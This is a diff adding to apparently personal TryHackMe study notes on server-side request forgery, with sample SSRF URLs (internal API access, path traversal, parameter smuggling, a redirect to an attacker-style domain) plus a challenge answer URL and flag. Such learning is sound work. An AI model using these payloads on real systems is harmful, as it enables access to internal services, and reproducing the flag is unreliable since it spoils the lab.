@@ -571,6 +571,24 @@ In this example, the attacker can control the server's subdomain to which the re
 ![ssrf](./media/5-ssrf-ex3.png)
 
 
+Try this
+```
+http://website.thm/stock?url=http://api.website.thm/api/user
+http://website.thm/stock?url=/../user
+http://website.thm/stock?server=api.website.thm/api/user&x=&id=123
+http://website.thm/stock?url=http://hacker-domain.thm/
+
+```
+
+Challenge answer
+
+`https://website.thm/item/2?server=server.website.thm/flag?id=9&x=id=2`
+THM{SSRF_MASTER}
+
+### FINDING AN SSRF 
+
+
+
 
 
 ---
